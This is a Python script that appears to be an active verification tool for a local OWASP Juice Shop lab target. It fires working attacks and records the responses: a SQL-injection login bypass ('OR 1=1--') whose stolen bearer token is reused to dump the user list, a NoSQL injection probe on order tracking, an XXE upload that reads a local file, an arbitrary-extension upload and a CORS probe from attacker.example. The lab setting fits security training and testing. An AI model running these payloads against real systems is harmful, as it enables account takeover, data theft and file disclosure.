import argparse
import json
import time
from pathlib import Path
from urllib.parse import quote, urljoin

import requests


def snippet(resp: requests.Response, limit: int = 1000) -> str:
    ctype = resp.headers.get("content-type", "")
    if any(x in ctype for x in ["text", "json", "html", "xml"]):
        return " ".join(resp.text.replace("\r", " ").replace("\n", " ").split())[:limit]
    return resp.content[:80].hex()


class Recorder:
    def __init__(self, out_dir: Path):
        self.out_dir = out_dir
        self.req_dir = out_dir / "requests"
        self.req_dir.mkdir(parents=True, exist_ok=True)
        self.events = []

    def record(self, name: str, req: dict, resp: requests.Response, extra: dict | None = None):
        item = {
            "name": name,
            "request": req,
            "response": {
                "status_code": resp.status_code,
                "url": resp.url,
                "elapsed_s": round(resp.elapsed.total_seconds(), 3),
                "content_type": resp.headers.get("content-type", ""),
                "content_length": resp.headers.get("content-length"),
                "response_len": len(resp.content),
                "headers_subset": {
                    k: resp.headers.get(k)
                    for k in [
                        "Access-Control-Allow-Origin",
                        "Access-Control-Allow-Credentials",
                        "Content-Security-Policy",
                        "X-Frame-Options",
                        "X-Content-Type-Options",
                        "Location",
                    ]
                    if k in resp.headers
                },
                "snippet": snippet(resp),
            },
            "extra": extra or {},
        }
        self.events.append(item)
        (self.req_dir / f"active-{name}.json").write_text(json.dumps(item, indent=2, ensure_ascii=False), encoding="utf-8")
        return item


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--out-dir", required=True)
    args = parser.parse_args()

    base = args.url.rstrip("/") + "/"
    out_dir = Path(args.out_dir)
    rec = Recorder(out_dir)
    started = time.time()
    s = requests.Session()

    # CORS validation with an arbitrary external Origin header. Request stays same-origin.
    r = s.get(base, headers={"Origin": "http://attacker.example"}, timeout=15)
    rec.record("cors-origin-arbitrary", {"method": "GET", "url": base, "headers": {"Origin": "http://attacker.example"}}, r)

    # Security header baseline.
    r = s.get(base, timeout=15)
    rec.record("security-headers-home", {"method": "GET", "url": base}, r)

    # Directory listing and public documentation/configuration.
    for name, path in [
        ("directory-listing-ftp", "ftp"),
        ("directory-listing-well-known", ".well-known"),
        ("api-docs", "api-docs/"),
        ("public-admin-config", "rest/admin/application-configuration"),
        ("public-admin-version", "rest/admin/application-version"),
    ]:
        url = urljoin(base, path)
        r = s.get(url, timeout=15)
        rec.record(name, {"method": "GET", "url": url}, r)

    # Search SQL injection: compare normal query with a syntax-breaking quote.
    normal = urljoin(base, "rest/products/search?q=apple")
    r = s.get(normal, timeout=15)
    rec.record("search-normal-baseline", {"method": "GET", "url": normal}, r)
    inj = urljoin(base, "rest/products/search?q=" + quote("'", safe=""))
    r = s.get(inj, timeout=15)
    rec.record("search-sqli-error-probe", {"method": "GET", "url": inj, "payload": "'"}, r)

    # Authentication bypass via observed SQL-concatenated login query.
    login_url = urljoin(base, "rest/user/login")
    invalid_body = {"email": "not-a-user@example.invalid", "password": "definitely_wrong_20260608"}
    r = s.post(login_url, json=invalid_body, timeout=15)
    rec.record("login-invalid-baseline", {"method": "POST", "url": login_url, "json": invalid_body}, r)

    bypass_body = {"email": "' OR 1=1--", "password": "irrelevant_20260608"}
    r = s.post(login_url, json=bypass_body, timeout=15)
    token = None
    bid = None
    umail = None
    try:
        auth = r.json().get("authentication", {})
        token = auth.get("token")
        bid = auth.get("bid")
        umail = auth.get("umail")
    except Exception:
        pass
    rec.record(
        "login-sqli-bypass",
        {"method": "POST", "url": login_url, "json": bypass_body},
        r,
        {"token_present": bool(token), "bid": bid, "umail": umail},
    )

    auth_headers = {}
    auth_cookies = {}
    if token:
        auth_headers = {"Authorization": f"Bearer {token}"}
        auth_cookies = {"token": token}
        s.cookies.set("token", token, domain="127.0.0.1", path="/")

    # Protected endpoints before/after auth bypass.
    users_url = urljoin(base, "api/Users")
    r = requests.get(users_url, timeout=15)
    rec.record("api-users-unauth-baseline", {"method": "GET", "url": users_url}, r)
    if token:
        r = s.get(users_url, headers=auth_headers, cookies=auth_cookies, timeout=15)
        rec.record("api-users-after-login-bypass", {"method": "GET", "url": users_url, "auth": "Bearer/cookie token from login-sqli-bypass"}, r)
        whoami_url = urljoin(base, "rest/user/whoami")
        r = s.get(whoami_url, headers=auth_headers, cookies=auth_cookies, timeout=15)
        rec.record("whoami-after-login-bypass", {"method": "GET", "url": whoami_url, "auth": "Bearer/cookie token from login-sqli-bypass"}, r)

    # NoSQL/order tracking expression probe, non-destructive GET only.
    nosql_payload = "x' || true || '"
    nosql_url = urljoin(base, "rest/track-order/" + quote(nosql_payload, safe=""))
    r = s.get(nosql_url, timeout=15)
    rec.record("track-order-nosql-probe", {"method": "GET", "url": nosql_url, "payload": nosql_payload}, r)

    # Upload tests: unexpected extension and safe XML external entity against a lab file.
    upload_url = urljoin(base, "file-upload")
    files = {"file": ("proof-20260608.txt", b"JUICE_UPLOAD_PROOF_20260608", "text/plain")}
    r = s.post(upload_url, files=files, timeout=15)
    rec.record("file-upload-unexpected-extension", {"method": "POST", "url": upload_url, "file": "proof-20260608.txt", "content_type": "text/plain"}, r)

    xxe_xml = """<?xml version="1.0"?>
<!DOCTYPE proof [ <!ENTITY xxe SYSTEM "file:///D:/WorkSpace/综合实践5/targets/juice-shop/ftp/legal.md"> ]>
<proof>&xxe;</proof>""".encode("utf-8")
    files = {"file": ("proof-xxe-20260608.xml", xxe_xml, "application/xml")}
    r = s.post(upload_url, files=files, timeout=20)
    rec.record("file-upload-xxe-local-lab-file", {"method": "POST", "url": upload_url, "file": "proof-xxe-20260608.xml", "entity": "file:///D:/WorkSpace/综合实践5/targets/juice-shop/ftp/legal.md"}, r)

    result = {
        "target": args.url,
        "started_epoch": started,
        "elapsed_s": round(time.time() - started, 3),
        "events": rec.events,
        "auth_state": {
            "initial_credentials": "none",
            "created_lab_account": False,
            "login_bypass_token_obtained": bool(token),
            "login_bypass_umail": umail,
            "login_bypass_bid": bid,
        },
    }
    (out_dir / "active-verification.json").write_text(json.dumps(result, indent=2, ensure_ascii=False), encoding="utf-8")
    print(json.dumps({"ok": True, "out": str(out_dir / "active-verification.json"), "elapsed_s": result["elapsed_s"], "token_obtained": bool(token)}, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
